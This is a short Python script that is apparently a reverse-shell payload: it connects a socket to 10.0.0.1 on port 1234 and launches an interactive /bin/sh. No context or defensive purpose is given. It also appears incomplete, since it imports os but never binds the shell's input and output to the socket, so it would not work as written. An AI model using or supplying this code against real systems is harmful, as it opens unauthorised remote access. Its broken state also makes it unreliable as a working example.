
import socket
import subprocess
import os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.0.1",1234))
subprocess.call(["/bin/sh","-i"])
    